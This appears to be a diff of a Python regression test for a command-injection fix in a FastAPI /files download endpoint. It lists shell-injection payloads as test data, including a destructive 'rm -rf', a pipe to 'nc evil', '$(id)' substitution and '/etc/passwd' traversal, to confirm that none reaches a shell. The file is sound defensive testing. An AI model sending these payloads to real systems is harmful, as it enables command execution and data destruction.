@@ -2,16 +2,17 @@
 Regression + unit tests for the /files download endpoint (agentic/api.py).
 
 Closes the unauthenticated OS command-injection (CWE-78) in `download_file`:
-the endpoint reads a file INSIDE kali-sandbox via the `kali_shell` MCP tool,
-which runs the command through `bash -c`. The untrusted `path` query param was
-interpolated into that shell string with only an `os.path.normpath` + `/tmp/`
-prefix check, neither of which strips shell metacharacters (`;`, `|`, `` ` ``,
-`$(...)`). A path like `/tmp/x; id` therefore ran a second command.
+the endpoint used to read a file INSIDE kali-sandbox via the `kali_shell` MCP
+tool, which runs the command through `bash -c`, with the untrusted `path`
+interpolated into that shell string (`/tmp/x; id` ran a second command).
 
-The fix (1) `shlex.quote`s the path so it is always a single literal argument,
-and (2) adds an auth dependency so the route is not unauthenticated: since step
-1.9 `Depends(require_configured_master_auth)`, the master key only (the webapp
-is its one caller; NF-01).
+Since the 4.9 review (finding 6) the endpoint reads the file from the project's
+workspace bind mount through the checked descriptor (open_download_for_project),
+so no shell is involved at all, and only the named project's workspace is
+served: /tmp and every other path is refused. The route also carries the master
+key dependency (`Depends(require_configured_master_auth)`, step 1.9; the webapp
+is its one caller, NF-01). The workspace confinement itself is
+tests/test_download_card_workspace.py.
 
 Needs fastapi + the agent runtime (imports api.py), so it runs in the agent
 container, not on a bare host:
@@ -22,15 +23,18 @@ anywhere.
 """
 
 import asyncio
-import base64
 import os
-import shlex
+import shutil
 import sys
+import tempfile
 from pathlib import Path
+from unittest import mock
 
 sys.path.insert(0, str(Path(__file__).resolve().parents[1]))  # agentic/
 
 results = []
+
+PROJECT = "p-inject"
 
 
 def check(name, cond):
@@ -39,19 +43,13 @@ def check(name, cond):
 
 
 class _FakeToolExecutor:
-    """Records every kali_shell command and returns canned success output."""
+    """Records every tool call: a download must make none."""
 
     def __init__(self):
         self.commands = []
 
     async def execute(self, tool_name, tool_args, phase, skip_phase_check=False):
-        cmd = tool_args.get("command", "")
-        self.commands.append((tool_name, cmd))
-        if cmd.startswith("test -f"):
-            # pretend the file exists (size 5) so the handler proceeds to base64
-            return {"success": True, "output": "5"}
-        if cmd.startswith("base64"):
-            return {"success": True, "output": base64.b64encode(b"hello").decode()}
+        self.commands.append((tool_name, tool_args.get("command", "")))
         return {"success": True, "output": ""}
 
 
@@ -60,28 +58,35 @@ class _FakeOrchestrator:
         self.tool_executor = _FakeToolExecutor()
 
 
-def _call(api, path):
+def _call(api, path, project_id=PROJECT):
     """Invoke the route coroutine directly (bypasses FastAPI dep-injection, so
     it exercises the handler body regardless of the auth dependency)."""
-    return asyncio.run(api.download_file(path=path))
+    return asyncio.run(api.download_file(projectId=project_id, path=path))
 
 
-# Payloads that MUST end up as a single shell argument. Mix of injection vectors
-# and legitimate-but-tricky filenames (spaces/parens/quotes) that the pre-fix
-# unquoted interpolation would have BROKEN as well as made injectable.
+def _body(resp) -> bytes:
+    """The bytes of a direct handler call: a plain Response or a stream."""
+    if hasattr(resp, "body_iterator"):
+        async def read():
+            return b"".join([chunk async for chunk in resp.body_iterator])
+        data = asyncio.run(read())
+        if resp.background is not None:
+            asyncio.run(resp.background())
+        return data
+    return getattr(resp, "body", b"")
+
+
+# Payloads that used to need shell quoting. Each is a path inside the project's
+# workspace now: none may reach a shell, and none names an existing file.
 INJECTION_PAYLOADS = [
-    ("/tmp/x; touch /tmp/PWNED", "semicolon"),
-    ("/tmp/x && rm -rf /", "and-rm"),
-    ("/tmp/x | nc evil 1", "pipe"),
-    ("/tmp/$(id)", "dollar-paren"),
-    ("/tmp/`id`", "backtick"),
-    ("/tmp/x\nid", "newline"),
-    ("/tmp/x > /tmp/out", "redirect"),
-    ("/tmp/x${IFS}id", "ifs-brace"),
-    # legitimate filenames that also require quoting to work at all:
-    ("/tmp/my report (1).pdf", "spaces-parens"),
-    ("/tmp/a'b.txt", "single-quote"),
-    ('/tmp/a"b.txt', "double-quote"),
+    ("notes/x; touch /tmp/PWNED", "semicolon"),
+    ("notes/x && rm -rf ~", "and-rm"),
+    ("notes/x | nc evil 1", "pipe"),
+    ("notes/$(id)", "dollar-paren"),
+    ("notes/`id`", "backtick"),
+    ("notes/x\nid", "newline"),
+    ("notes/x > out", "redirect"),
+    ("notes/x${IFS}id", "ifs-brace"),
 ]
 
 
@@ -89,126 +94,108 @@ def main():
     try:
         import api  # noqa: E402  (needs fastapi + agent deps)
         import llm_guard  # noqa: E402
+        import workspace_fs  # noqa: E402
     except Exception as exc:
         print(f"SKIP: cannot import api ({exc}); run inside the agent container")
         return 0
 
     fake = _FakeOrchestrator()
     api.orchestrator = fake
-
-    # ---- 1. Definitive correctness: every command the handler builds must
-    #         shlex.split back to exactly [tool, args..., <the literal path>].
-    #         If any metacharacter escaped the quoting, shlex.split would yield
-    #         extra tokens and this fails. This covers ALL vectors at once. ----
-    for payload, label in INJECTION_PAYLOADS:
-        fake.tool_executor.commands.clear()
-        _call(api, payload)
-        normalized = os.path.normpath(payload)
-        cmds = [c for _, c in fake.tool_executor.commands]
-        ok = bool(cmds)
-        for c in cmds:
-            tokens = shlex.split(c)
-            # the LAST token must be the whole path, verbatim; and the command
-            # must be exactly the expected argv (no injected trailing tokens).
-            if c.startswith("base64"):
-                ok = ok and tokens == ["base64", "-w0", normalized]
-            elif c.startswith("test -f"):
-                ok = ok and tokens == ["test", "-f", normalized, "&&", "stat", "-c", "%s", normalized]
-            else:
-                ok = False
-        check(f"quoting round-trips to one arg ({label})", ok)
-
-    # ---- 2. Benign path is unchanged (no needless quoting / no regression) ----
-    fake.tool_executor.commands.clear()
-    resp = _call(api, "/tmp/report.pdf")
-    benign_cmds = [c for _, c in fake.tool_executor.commands]
-    check(
-        "benign: safe path passes through without added quotes",
-        "base64 -w0 /tmp/report.pdf" in benign_cmds,
-    )
-    check(
-        "benign: returns the decoded bytes (200-path)",
-        getattr(resp, "body", b"") == b"hello",
-    )
-
-    # ---- 3. Legit filename with spaces still downloads (functional, not just
-    #         safe): pre-fix this broke; post-fix it must reach base64 and 200. ----
-    fake.tool_executor.commands.clear()
-    resp_sp = _call(api, "/tmp/my report (1).pdf")
-    check(
-        "spaces: filename with spaces reaches base64 and returns bytes",
-        getattr(resp_sp, "body", b"") == b"hello"
-        and any(c == "base64 -w0 '/tmp/my report (1).pdf'" for _, c in fake.tool_executor.commands),
-    )
-
-    # ---- 4. Prefix / traversal guards still reject non-/tmp paths ----
-    r_outside = _call(api, "/etc/passwd")
-    check("guard: non-/tmp path is forbidden (403)", getattr(r_outside, "status_code", None) == 403)
-    r_trav = _call(api, "/tmp/../etc/passwd")
-    check("guard: /tmp/../ traversal is forbidden (403)", getattr(r_trav, "status_code", None) == 403)
-
-    # ---- 5. The route carries the master-key dependency (declared; NF-01, step 1.9) ----
-    files_route = next(
-        (r for r in api.app.routes if getattr(r, "path", None) == "/files"), None
-    )
-    dep_calls = []
-    if files_route is not None and getattr(files_route, "dependant", None) is not None:
-        dep_calls = [d.call for d in files_route.dependant.dependencies]
-    check(
-        "auth: /files declares Depends(require_configured_master_auth)",
-        llm_guard.require_configured_master_auth in dep_calls,
-    )
-    check(
-        "auth: /files no longer takes the scanner key (require_internal_auth_only)",
-        llm_guard.require_internal_auth_only not in dep_calls,
-    )
-
-    # ---- 6. The dependency actually ENFORCES via a real request (TestClient).
-    #         Sets INTERNAL_API_KEY so llm_guard is fail-CLOSED, then checks
-    #         missing/wrong/correct key. ----
+    tmp = Path(tempfile.mkdtemp(prefix="files-inject-"))
+    root_patch = mock.patch.object(workspace_fs, "WORKSPACE_ROOT", tmp)
+    root_patch.start()
     try:
-        from fastapi.testclient import TestClient
+        root = workspace_fs.resolve_for_project(PROJECT, ".")
+        (root / "notes" / "report.pdf").write_bytes(b"hello")
+        (root / "notes" / "my report (1).pdf").write_bytes(b"hello")
+        (root / "notes" / "a'b.txt").write_bytes(b"hello")
 
-        prev_key = os.environ.get("INTERNAL_API_KEY")
-        os.environ["INTERNAL_API_KEY"] = "unit-test-key"
-        # Reset any cached fail-open warning so behaviour reflects the key.
-        client = TestClient(api.app)  # no `with`: does not run lifespan
+        # ---- 1. No payload reaches a shell: the handler makes no tool call at all ----
+        for payload, label in INJECTION_PAYLOADS:
+            fake.tool_executor.commands.clear()
+            resp = _call(api, payload)
+            check(f"no shell, nothing served ({label})",
+                  not fake.tool_executor.commands and getattr(resp, "status_code", None) in (403, 404))
 
-        r_nokey = client.get("/files", params={"path": "/tmp/report.pdf"})
-        check("auth(enforce): no key -> 401", r_nokey.status_code == 401)
+        # ---- 2. A file of the project's workspace downloads, by absolute or relative path ----
+        resp = _call(api, f"/workspace/{PROJECT}/notes/report.pdf")
+        check("benign: an absolute workspace path returns the bytes (200)",
+              getattr(resp, "status_code", None) == 200 and _body(resp) == b"hello")
+        resp = _call(api, "notes/report.pdf")
+        check("benign: a workspace-relative path returns the bytes (200)",
+              getattr(resp, "status_code", None) == 200 and _body(resp) == b"hello")
 
-        r_badkey = client.get(
-            "/files", params={"path": "/tmp/report.pdf"},
-            headers={"x-internal-key": "wrong"},
+        # ---- 3. Legit filenames that once needed quoting still download ----
+        for name in ("my report (1).pdf", "a'b.txt"):
+            resp = _call(api, f"/workspace/{PROJECT}/notes/{name}")
+            check(f"quoting-era filename downloads ({name})",
+                  getattr(resp, "status_code", None) == 200 and _body(resp) == b"hello")
+        check("benign: no tool call for any download", not fake.tool_executor.commands)
+
+        # ---- 4. Paths outside the project's workspace are forbidden ----
+        for path, label in (("/etc/passwd", "absolute elsewhere"), ("/tmp/report.pdf", "the sandbox /tmp"),
+                            ("/tmp/../etc/passwd", "/tmp traversal"),
+                            (f"/workspace/{PROJECT}/../other/a.txt", "workspace traversal")):
+            check(f"guard: {label} is forbidden (403)", getattr(_call(api, path), "status_code", None) == 403)
+        check("guard: no projectId is refused (400)",
+              getattr(_call(api, "notes/report.pdf", project_id=""), "status_code", None) == 400)
+
+        # ---- 5. The route carries the master-key dependency (declared; NF-01, step 1.9) ----
+        files_route = next(
+            (r for r in api.app.routes if getattr(r, "path", None) == "/files"), None
         )
-        check("auth(enforce): wrong key -> 401", r_badkey.status_code == 401)
-
-        r_okkey = client.get(
-            "/files", params={"path": "/tmp/report.pdf"},
-            headers={"x-internal-key": "unit-test-key"},
+        dep_calls = []
+        if files_route is not None and getattr(files_route, "dependant", None) is not None:
+            dep_calls = [d.call for d in files_route.dependant.dependencies]
+        check(
+            "auth: /files declares Depends(require_configured_master_auth)",
+            llm_guard.require_configured_master_auth in dep_calls,
         )
         check(
-            "auth(enforce): correct key -> reaches handler (not 401)",
-            r_okkey.status_code != 401,
+            "auth: /files no longer takes the scanner key (require_internal_auth_only)",
+            llm_guard.require_internal_auth_only not in dep_calls,
         )
-        # and injection is still inert through the full request path:
-        fake.tool_executor.commands.clear()
-        client.get(
-            "/files", params={"path": "/tmp/x; touch /tmp/PWNED"},
-            headers={"x-internal-key": "unit-test-key"},
-        )
-        end_to_end_ok = all(
-            shlex.split(c) and "/tmp/x; touch /tmp/PWNED" in shlex.split(c)
-            for _, c in fake.tool_executor.commands
-        ) and bool(fake.tool_executor.commands)
-        check("auth(enforce): injection inert through full HTTP path", end_to_end_ok)
 
-        if prev_key is None:
-            os.environ.pop("INTERNAL_API_KEY", None)
-        else:
-            os.environ["INTERNAL_API_KEY"] = prev_key
-    except Exception as exc:
-        print(f"  [SKIP] TestClient auth-enforcement checks unavailable ({exc})")
+        # ---- 6. The dependency actually ENFORCES via a real request (TestClient).
+        #         Sets INTERNAL_API_KEY so llm_guard is fail-CLOSED, then checks
+        #         missing/wrong/correct key. ----
+        try:
+            from fastapi.testclient import TestClient
+
+            prev_key = os.environ.get("INTERNAL_API_KEY")
+            os.environ["INTERNAL_API_KEY"] = "unit-test-key"
+            client = TestClient(api.app)  # no `with`: does not run lifespan
+            params = {"projectId": PROJECT, "path": "notes/report.pdf"}
+
+            r_nokey = client.get("/files", params=params)
+            check("auth(enforce): no key -> 401", r_nokey.status_code == 401)
+
+            r_badkey = client.get("/files", params=params, headers={"x-internal-key": "wrong"})
+            check("auth(enforce): wrong key -> 401", r_badkey.status_code == 401)
+
+            r_okkey = client.get("/files", params=params, headers={"x-internal-key": "unit-test-key"})
+            check(
+                "auth(enforce): correct key -> the file (200)",
+                r_okkey.status_code == 200 and r_okkey.content == b"hello",
+            )
+            # and injection is still inert through the full request path:
+            fake.tool_executor.commands.clear()
+            r_inject = client.get(
+                "/files", params={"projectId": PROJECT, "path": "notes/x; touch /tmp/PWNED"},
+                headers={"x-internal-key": "unit-test-key"},
+            )
+            check("auth(enforce): injection inert through full HTTP path",
+                  r_inject.status_code == 404 and not fake.tool_executor.commands)
+
+            if prev_key is None:
+                os.environ.pop("INTERNAL_API_KEY", None)
+            else:
+                os.environ["INTERNAL_API_KEY"] = prev_key
+        except Exception as exc:
+            print(f"  [SKIP] TestClient auth-enforcement checks unavailable ({exc})")
+    finally:
+        root_patch.stop()
+        shutil.rmtree(tmp, ignore_errors=True)
 
     # ---- Summary ----
     passed = sum(1 for _, ok in results if ok)
